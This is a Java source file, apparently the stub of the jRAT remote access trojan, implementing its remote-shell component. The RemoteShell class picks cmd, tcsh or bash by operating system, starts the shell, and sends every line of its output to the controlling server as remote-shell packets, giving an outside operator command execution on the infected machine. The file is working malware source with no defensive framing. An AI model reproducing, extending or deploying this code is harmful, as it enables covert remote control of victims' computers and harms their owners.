package se.jrat.stub;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import se.jrat.stub.packets.outgoing.Packet21RemoteShell;

import com.redpois0n.oslib.OperatingSystem;


public class RemoteShell extends Thread {

	public static Process p;

	public void run() {
		String line;
		try {
			
			String shell;
			
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				shell = "cmd";
			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.FREEBSD || OperatingSystem.getOperatingSystem() == OperatingSystem.OPENBSD || OperatingSystem.getOperatingSystem() == OperatingSystem.NETBSD) {
				shell = "/bin/tcsh";
			} else {
				shell = "/bin/bash";
			}
			
			ProcessBuilder builder = new ProcessBuilder(shell);
			builder.redirectErrorStream(true);
			p = builder.start();
			
			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((line = input.readLine()) != null) {
				if (!line.trim().equals("")) {
					Connection.addToSendQueue(new Packet21RemoteShell(line));
				}
			}
			input.close();
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.addToSendQueue(new Packet21RemoteShell("Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
